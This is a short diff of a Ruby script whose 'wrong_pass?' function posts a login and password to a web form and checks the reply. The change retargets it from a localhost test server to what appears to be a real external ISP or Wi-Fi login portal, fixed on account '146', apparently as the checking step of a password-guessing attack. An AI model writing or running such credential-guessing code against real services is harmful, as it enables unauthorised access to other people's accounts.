@@ -1,10 +1,11 @@
+# encoding: ASCII-8BIT
 require 'net/http'
 require 'uri'
 
 def wrong_pass? password
-	uri = URI.parse 'http://localhost:4567'
-	response = Net::HTTP.post_form(uri, :login => "admin", :password => password).body
-	response.include? "Acces denied"
+	uri = URI.parse 'http://wifilan.lg.ua:8088/'
+	response = Net::HTTP.post_form(uri, :ulogin => "146", :upassword => password).body
+	response.include? "146"
 end
 
 
